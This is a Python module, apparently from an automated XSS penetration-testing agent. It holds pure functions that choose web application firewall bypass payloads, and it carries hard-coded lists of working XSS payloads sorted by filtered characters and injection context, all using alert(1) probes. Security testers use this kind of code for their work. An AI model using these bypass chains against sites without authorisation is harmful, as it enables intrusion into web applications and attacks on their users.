"""
Pure WAF detection and bypass functions for XSS testing.

No I/O, no state mutation. All functions take data as parameters
and return new values without side effects.

Extracted from xss_agent.py (lines 2774-2803, 8702-8871).
"""

from typing import Dict, List, Optional, Tuple

import logging

logger = logging.getLogger("agents.xss_v4")


# =========================================================================
# Payload encoding detection (pure)
# =========================================================================

def detect_payload_encoding(payload: str) -> str:
    """
    Detect which encoding technique was used in a payload.

    Inspects the payload string for known encoding patterns and returns
    a label identifying the technique.

    Args:
        payload: The XSS payload string to analyze.

    Returns:
        A string label for the detected encoding technique,
        or "unknown" if no known pattern is found.
    """
    if "%25" in payload:
        return "double_url_encode"
    if "\\u00" in payload:
        return "unicode_encode"
    if "&#x" in payload:
        return "html_entity_hex"
    if "&#" in payload:
        return "html_entity_encode"
    if "%00" in payload or "%0" in payload:
        return "null_byte_injection"
    if "/**/" in payload:
        return "comment_injection"
    return "unknown"


# =========================================================================
# Bypass result recording (pure - returns new dict)
# =========================================================================

def record_bypass_result(
    bypass_stats: Dict,
    waf_name: Optional[str],
    payload: str,
    success: bool,
) -> Dict:
    """
    Record a bypass attempt result, returning a NEW stats dict.

    Instead of mutating instance state, this returns a fresh dictionary
    with the new result appended. The caller is responsible for using
    the returned value.

    Args:
        bypass_stats: Current bypass statistics dictionary.
        waf_name: Name of the detected WAF, or None.
        payload: The payload that was tested.
        success: Whether the bypass attempt succeeded.

    Returns:
        A new dictionary with the recorded result merged in.
        Returns the original dict unchanged if waf_name is falsy.
    """
    if not waf_name:
        return bypass_stats

    encoding_used = detect_payload_encoding(payload)

    # Build new stats with the result appended
    new_stats = dict(bypass_stats)
    results_key = "results"
    results = list(new_stats.get(results_key, []))
    results.append({
        "waf": waf_name,
        "encoding": encoding_used,
        "success": success,
        "payload_preview": payload[:80],
    })
    new_stats[results_key] = results

    # Update per-WAF counters
    waf_key = waf_name.lower()
    waf_counters = dict(new_stats.get("waf_counters", {}))
    counter = dict(waf_counters.get(waf_key, {"success": 0, "fail": 0}))
    if success:
        counter["success"] = counter["success"] + 1
    else:
        counter["fail"] = counter["fail"] + 1
    waf_counters[waf_key] = counter
    new_stats["waf_counters"] = waf_counters

    return new_stats


# =========================================================================
# WAF-optimized payload generation (pure, sync)
# =========================================================================

def get_waf_optimized_payloads(
    base_payloads: List[str],
    waf_name: Optional[str],
    encode_fn,
    max_variants: int = 3,
) -> List[str]:
    """
    Apply encoding to payloads based on the detected WAF.

    This is the pure core of the WAF optimization pipeline. It takes
    an encoding function (typically from encoding_techniques.encode_payload)
    so it can remain free of external dependencies.

    Args:
        base_payloads: Original payloads to optimize.
        waf_name: Detected WAF name. If falsy, returns base_payloads as-is.
        encode_fn: Callable(payload, waf, max_variants) -> List[str]
                   that generates encoded variants for a single payload.
        max_variants: Maximum encoded variants per payload.

    Returns:
        Deduplicated list of payloads (originals + encoded variants).
    """
    if not waf_name:
        return list(base_payloads)

    encoded_payloads = []
    for payload in base_payloads[:20]:  # Limit base payloads to avoid explosion
        # Add original payload first
        encoded_payloads.append(payload)

        # Apply encoding
        variants = encode_fn(payload, waf=waf_name, max_variants=max_variants)
        encoded_payloads.extend(variants)

    # Deduplicate while preserving order
    seen = set()
    unique_payloads = []
    for p in encoded_payloads:
        if p not in seen:
            seen.add(p)
            unique_payloads.append(p)

    return unique_payloads


# =========================================================================
# Bypass strategy: WAF encoding
# =========================================================================

def bypass_try_waf_encoding(
    original_payload: str,
    waf_signature: Optional[str],
    tried_variants: List[str],
    encoded_variants: List[str],
) -> Tuple[Optional[str], str]:
    """
    Try to generate a WAF bypass variant using pre-computed encoded variants.

    The caller must compute encoded_variants beforehand (e.g. via
    get_waf_optimized_payloads or the async Q-Learning pipeline).

    Args:
        original_payload: The payload that failed.
        waf_signature: WAF identifier string.
        tried_variants: Payloads already attempted (to avoid duplicates).
        encoded_variants: Pre-computed encoded variants of the payload.

    Returns:
        Tuple of (variant_or_None, technique_label).
    """
    if not waf_signature or waf_signature.lower() == "no identificado":
        return None, "waf_encoding"

    for variant in encoded_variants:
        if variant not in tried_variants and variant != original_payload:
            return variant, "waf_encoding"

    return None, "waf_encoding"


# =========================================================================
# Bypass strategy: character obfuscation
# =========================================================================

def bypass_try_char_obfuscation(
    stripped_chars: Optional[str],
    tried_variants: List[str],
) -> Tuple[Optional[str], str]:
    """
    Generate a bypass variant using character obfuscation techniques.

    When specific characters are filtered by the server, this function
    selects alternative payloads that avoid those characters.

    Args:
        stripped_chars: String of characters that were filtered/stripped.
        tried_variants: Payloads already attempted.

    Returns:
        Tuple of (variant_or_None, technique_label).
    """
    if not stripped_chars:
        return None, "char_obfuscation"

    bypass_techniques = []

    # If '<' and '>' are filtered, try event handlers
    if '<' in stripped_chars or '>' in stripped_chars:
        bypass_techniques.extend([
            '" autofocus onfocus=alert(1) x="',
            '" onload=alert(1) x="',
            '" onerror=alert(1) x="',
        ])

    # If 'script' is filtered, try alternatives
    if 'script' in stripped_chars.lower():
        bypass_techniques.extend([
            '<img src=x onerror=alert(1)>',
            '<svg onload=alert(1)>',
            '<body onload=alert(1)>',
        ])

    # If parentheses are filtered, use backticks
    if '(' in stripped_chars or ')' in stripped_chars:
        bypass_techniques.extend([
            '<img src=x onerror=alert`1`>',
            '<svg onload=alert`1`>',
        ])

    for variant in bypass_techniques:
        if variant not in tried_variants:
            return variant, "char_obfuscation"

    return None, "char_obfuscation"


# =========================================================================
# Bypass strategy: context-specific
# =========================================================================

def bypass_try_context_specific(
    detected_context: Optional[str],
    tried_variants: List[str],
) -> Tuple[Optional[str], str]:
    """
    Generate a bypass variant based on the detected HTML context.

    Different injection contexts (attribute, script block, HTML body)
    require different breakout/injection strategies.

    Args:
        detected_context: The HTML context where the payload was reflected.
        tried_variants: Payloads already attempted.

    Returns:
        Tuple of (variant_or_None, technique_label).
    """
    if not detected_context:
        return None, "context_specific"

    context_lower = detected_context.lower()
    context_specific = []

    if 'attribute' in context_lower or 'attr' in context_lower:
        context_specific.extend([
            '" autofocus onfocus=alert(1) x="',
            "' autofocus onfocus=alert(1) x='",
            '" onmouseover=alert(1) x="',
        ])
    elif 'script' in context_lower:
        context_specific.extend([
            '</script><img src=x onerror=alert(1)>',
            '-alert(1)-',
            ';alert(1);//',
        ])
    elif 'html' in context_lower or 'body' in context_lower:
        context_specific.extend([
            '<img src=x onerror=alert(1)>',
            '<svg onload=alert(1)>',
            '<iframe onload=alert(1)>',
        ])

    for variant in context_specific:
        if variant not in tried_variants:
            return variant, "context_specific"

    return None, "context_specific"


# =========================================================================
# Bypass strategy: universal payloads
# =========================================================================

_UNIVERSAL_ADVANCED_PAYLOADS = [
    '<img src=x onerror=alert(1)>',
    '<svg/onload=alert(1)>',
    '<iframe src=javascript:alert(1)>',
    '<body onload=alert(1)>',
    '<input onfocus=alert(1) autofocus>',
    '<select onfocus=alert(1) autofocus>',
    '<textarea onfocus=alert(1) autofocus>',
    '<keygen onfocus=alert(1) autofocus>',
    '<video><source onerror=alert(1)>',
    '<audio src=x onerror=alert(1)>',
]


def bypass_try_universal_payloads(
    tried_variants: List[str],
) -> Tuple[Optional[str], str]:
    """
    Generate a universal bypass payload as a last-resort fallback.

    These payloads work across a wide range of contexts and don't
    depend on specific WAF or character-filter knowledge.

    Args:
        tried_variants: Payloads already attempted.

    Returns:
        Tuple of (variant_or_None, technique_label).
    """
    for variant in _UNIVERSAL_ADVANCED_PAYLOADS:
        if variant not in tried_variants:
            return variant, "universal"

    return None, "universal"


# =========================================================================
# Orchestrator: try all bypass strategies in order
# =========================================================================

def generate_bypass_variant(
    original_payload: str,
    failure_reason: str,
    waf_signature: Optional[str] = None,
    stripped_chars: Optional[str] = None,
    detected_context: Optional[str] = None,
    tried_variants: Optional[List[str]] = None,
    encoded_variants: Optional[List[str]] = None,
) -> Optional[str]:
    """
    Generate a bypass XSS payload variant based on failure feedback.

    Tries each bypass strategy in priority order:
    1. WAF encoding bypass
    2. Character obfuscation
    3. Context-specific payloads
    4. Universal fallback payloads

    Args:
        original_payload: The payload that failed.
        failure_reason: Why it failed (waf_blocked, chars_filtered, etc.).
        waf_signature: WAF identifier, if detected.
        stripped_chars: Characters that were filtered by the server.
        detected_context: HTML context where the payload was reflected.
        tried_variants: List of payloads already attempted.
        encoded_variants: Pre-computed WAF-encoded variants of the payload.

    Returns:
        A new payload string, or None if all strategies are exhausted.
    """
    tried = tried_variants or []
    encoded = encoded_variants or []

    variant, _ = bypass_try_waf_encoding(original_payload, waf_signature, tried, encoded)
    if variant:
        return variant

    variant, _ = bypass_try_char_obfuscation(stripped_chars, tried)
    if variant:
        return variant

    variant, _ = bypass_try_context_specific(detected_context, tried)
    if variant:
        return variant

    variant, _ = bypass_try_universal_payloads(tried)
    if variant:
        return variant

    return None


__all__ = [
    "detect_payload_encoding",
    "record_bypass_result",
    "get_waf_optimized_payloads",
    "bypass_try_waf_encoding",
    "bypass_try_char_obfuscation",
    "bypass_try_context_specific",
    "bypass_try_universal_payloads",
    "generate_bypass_variant",
]
